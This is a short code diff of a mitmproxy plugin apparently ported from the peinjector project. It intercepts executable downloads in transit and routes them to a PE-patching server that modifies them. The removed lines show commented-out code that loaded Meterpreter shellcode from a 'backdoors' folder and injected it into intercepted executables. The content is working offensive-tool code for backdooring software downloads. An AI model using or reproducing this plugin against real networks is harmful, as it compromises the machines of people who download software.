@@ -3,9 +3,7 @@ This module is a ported version of pe-injector-interceptor which uses an outdate
 https://github.com/JonDoNym/peinjector/blob/master/pe-injector-interceptor/peinjector_interceptor.py
 """
 
-import peshellinjector
-from os import path
-from mitmproxy.models import decoded
+import os
 from mitmplugin import MITMPlugin
 from ..MITMPluginsAux.libPePatch import PePatch
 
@@ -45,11 +43,8 @@ class PeInjector(MITMPlugin):
 	# Handles Streaming
 	def responseheaders(self, flow):
 		try:
-			#print "Content is: ", str(flow.response.headers["Content-Type"])
 			if flow.response.headers["Content-Type"] in exe_mimetypes:
 				flow.response.stream = build_pe_modifier(flow, (self.config["pe_server_address"], self.config["pe_server_port"]), self.pe_modifier_config)
-				#shellcode = open("data/backdoors/exe/meterpreter.bin", 'rb').read()
-				#flow.response.content = peshellinjector.injectPE(flow.response.content, shellcode)
 			else:
 				flow.response.stream = bypass_stream
 		except Exception as e:
